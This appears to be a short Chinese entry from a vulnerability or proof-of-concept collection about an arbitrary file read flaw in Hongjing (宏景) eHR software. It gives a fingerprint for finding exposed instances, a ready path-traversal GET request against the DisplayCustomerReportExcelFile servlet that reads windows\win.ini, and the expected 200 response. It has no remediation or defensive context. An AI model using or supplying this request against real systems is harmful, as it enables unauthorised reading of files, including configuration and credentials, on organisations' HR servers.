# 宏景eHRDisplayCustomerReportExcelFile存在任意文件读取漏洞

宏景 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /servlet/DisplayCustomerReportExcelFile?filename=..%5C..%5Cwindows%5Cwin.ini HTTP/1.1`
- **响应特征**：200